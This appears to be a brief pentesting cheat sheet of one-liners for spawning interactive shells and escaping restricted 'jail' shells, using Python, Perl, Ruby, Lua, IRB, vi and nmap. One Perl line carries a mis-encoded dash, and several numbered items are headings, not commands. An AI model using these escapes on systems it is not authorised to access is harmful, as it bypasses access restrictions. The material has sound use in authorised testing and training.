Shell Spawning

    1. python -c 'import pty; pty.spawn("/bin/sh")'

    2. echo os.system('/bin/bash')

    3. /bin/sh -i

    4. perl â€”e 'exec "/bin/sh";'

    5. perl: exec "/bin/sh";

    6. ruby: exec "/bin/sh"

    7. lua: os.execute('/bin/sh')

    8. (From within IRB)

    9. exec "/bin/sh"

    10. (From within vi)

    11. :!bash

    12. (From within vi)

    13. :set shell=/bin/bash:shell

    14. (From within nmap)

    15. !sh

Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.
